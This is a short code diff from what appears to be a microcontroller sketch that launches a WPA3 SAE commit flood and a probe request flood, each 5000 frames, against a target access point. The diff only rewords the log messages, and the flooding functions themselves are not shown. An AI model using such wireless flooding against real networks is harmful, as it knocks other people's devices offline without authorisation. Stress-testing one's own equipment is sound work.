@@ -19,10 +19,10 @@ void setup() {
     // Lock frequency
     engine.setTarget(TARGET_BSSID, 6);
     
-    Serial.println("[+] Firing Massive SAE Commit Flood (WPA3 DoS) over 5 seconds...");
+    Serial.println("[+] Firing Massive SAE Commit Flood (WPA3 DoS) — 5000 frames...");
     saeCommitFlood(TARGET_BSSID, 5000);
-    
-    Serial.println("[+] Firing Massive Probe Request Flood over 5 seconds...");
+
+    Serial.println("[+] Firing Massive Probe Request Flood — 5000 frames...");
     probeRequestFlood(5000);
 
     Serial.println("[+] Stress Tests Executed Successfully!");
